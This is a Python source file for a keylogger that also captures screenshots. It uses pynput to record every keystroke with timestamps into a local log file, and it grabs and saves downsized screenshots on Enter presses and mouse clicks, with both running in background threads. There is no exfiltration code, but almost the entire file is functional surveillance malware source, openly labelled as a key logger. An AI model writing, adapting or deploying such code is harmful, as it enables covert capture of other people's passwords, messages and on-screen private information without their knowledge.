from pynput.keyboard import Listener
from pynput.mouse import Listener as M_Listener
from time import time, asctime
from PIL import Image
import threading
from pyscreenshot import grab
import os

# Used to transform the float time into a string format
def format_time():
    return asctime().replace(" ", "_")

image_time = time()
temp_time = time()
line_buffer = "\n" + format_time() + "\t"

#Dictionary used to replace specific keystrokes
key_dict = {
        "Key.space" : " ",
        "Key.shift" : "",
        "Key.shift_r" : "",
        "Key.shift_l" : "",
        "Key.ctrl" : "<control>",
        "Key.ctrl_l" : "<control>",
        "Key.ctrl_r" : "<control>",
        "Key.enter" : "\n",
        "Key.cmd" : "<command>",
        "Key.cmd_r" : "<command>",
        "Key.cmd_l" : "<command>",
        "Key.caps_lock" : "<caps_lock>",
        "Key.tab" : "<tab>",
        "Key.alt" : "<alt>",
        "Key.alt_r" : "<alt>",
        "Key.alt_l" : "<alt>",
        "Key.right" : "",
        "Key.left" : "",
        "Key.down" : "",
        "Key.up" : "",
        "Key.end" : "",
        "Key.page_down" : "",
        "Key.page_up" : "",
        "Key.home" : "<home_key>",
        "Key.esc" : "<esc>",
        "Key.f1" : "<f1>",
        "Key.f2" : "<f2>",
        "Key.f3" : "<f3>",
        "Key.f4" : "<f4>",
        "Key.f5" : "<f5>",
        "Key.f6" : "<f6>",
        "Key.f7" : "<f7>",
        "Key.f8" : "<f8>",
        "Key.f9" : "<f9>",
        "Key.f10" : "<f10>",
        "Key.f11" : "<f11>",
        "Key.f12" : "<f12>",
        "Key.f13" : "<f13>",
        "Key.f14" : "<f14>",
        "Key.f15" : "<f15>",
        "Key.delete" : "<delete>",
        "Key.backspace" : "\b"
        }
#When a key is pressed, 
def write_to_file(key):
    global temp_time
    global line_buffer
    letter = str(key).replace("'", "")
    #Replace letter if in key dictionary
    if letter in key_dict:
        letter = key_dict[letter]
    line_buffer += letter
    # If length of the buffer is over 100, write to file
    if len(line_buffer) > 100:
        line_buffer += "\n" + format_time() + "\t"
        to_log(line_buffer)
        line_buffer = ""
        temp_time = time()
    # If the letter is a newline symbol, take a screenshot and write the current line_buffer to file
    elif letter == "\n":
        save_screenshot(0, 0, 0, 0)
        line_buffer += format_time() + "\t"
        to_log(line_buffer)
        line_buffer = ""
        temp_time = time()
    #If the 'timeout' is reached and the linebuffer less than 4, write to file
    elif time() - temp_time > 60 and len(line_buffer) < 4:
        temp_time = time()
    elif time() - temp_time > 60:
    #Else if the 'timeout' is reached, write to file and reset the buffer
        line_buffer += "\n" + format_time() + "\t"
        to_log(line_buffer)
        line_buffer = ""
        temp_time = time()

#Writes to the log
def to_log(line_buffer):
    with open("log.txt", "a") as log:
        log.write(line_buffer)

#Saves a screenshot to the screenshots folder
def save_screenshot(a, b, c, d):
    global image_time
    if time() - image_time > 2:
        temp_time = format_time()
        image_time = time()
        temp_time = temp_time.replace(":","-")
        im = grab()
        im = im.resize((2*im.size[0]//5,2*im.size[1]//5),Image.ANTIALIAS)
        im.save(".\screenshots\\" + temp_time + ".jpeg")

#Key Logger
def key_logger():
    with Listener(on_press = write_to_file) as listen:
        try:
            listen.join()
        except:
            pass

#Screenshot logger
def screenshot_logger():
    with M_Listener(on_click = save_screenshot) as m_listen:
        try:
            m_listen.join()
        except:
            pass


if __name__ == "__main__":
    os.mkdir("Screenshots")
    threading.Thread(target=key_logger).start()
    threading.Thread(target=screenshot_logger).start()